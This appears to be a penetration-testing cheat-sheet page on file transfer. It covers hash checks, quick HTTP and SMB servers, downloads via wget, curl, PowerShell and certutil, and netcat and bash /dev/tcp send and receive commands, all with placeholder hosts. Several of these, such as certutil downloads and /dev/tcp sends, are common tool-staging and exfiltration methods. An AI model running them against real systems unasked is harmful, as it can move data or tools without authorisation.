---
icon: arrow-right-arrow-left
---

# File Transfer

## Integrity verification

{% tabs %}
{% tab title="Linux" %}
{% code overflow="wrap" %}
```batch
md5sum <file>
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```batch
certutil -hashfile <file> md5
```
{% endcode %}
{% endtab %}
{% endtabs %}

## HTTP

### HTTP Server

{% tabs %}
{% tab title="Python3" %}
```
python3 -m http.server <port>
```
{% endtab %}

{% tab title="Python2" %}
```
python2 -m SimpleHTTPServer <port>
```
{% endtab %}

{% tab title="PHP" %}
```
php -S 0:<port>
```
{% endtab %}
{% endtabs %}

### Download

{% tabs %}
{% tab title="Wget" %}
{% code overflow="wrap" %}
```bash
wget <url>
```
{% endcode %}
{% endtab %}

{% tab title="Curl" %}
{% code overflow="wrap" %}
```bash
curl -s <url> -o <output>
```
{% endcode %}
{% endtab %}

{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadString('<url>') > <output>
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest <url> -o <output>
```
{% endcode %}
{% endtab %}

{% tab title="CMD" %}
{% code overflow="wrap" %}
```batch
certutil -urlcache -split -f <url> <output>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## SMB

### SMB Server

```bash
smbserver.py <share> $(pwd) -smb2support [-username user -password pass]
```

### Download

{% tabs %}
{% tab title="Linux" %}
{% code overflow="wrap" %}
```bash
smbclient -U 'user[%pass]' //<ip>/<share> -c "get <file> <output>"
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```powershell
# mount smb Share to drive
net use z: \\<ip>\<share> [/user:user pass]
# copy from share
copy \\<ip>\<share>\<file> <output>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Netcat

{% tabs %}
{% tab title="Send" %}
{% code overflow="wrap" %}
```bash
nc -nlvp <port> < <file>
```
{% endcode %}
{% endtab %}

{% tab title="Recieve" %}
{% code overflow="wrap" %}
```bash
nc -nlvp <port> > <output>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Bash

{% tabs %}
{% tab title="Send" %}
{% code overflow="wrap" %}
```bash
cat <file> > /dev/tcp/<ip>/<port>
```
{% endcode %}
{% endtab %}

{% tab title="Recieve" %}
{% code overflow="wrap" %}
```bash
cat < /dev/tcp/<target>/<port> > <output>
```
{% endcode %}
{% endtab %}
{% endtabs %}
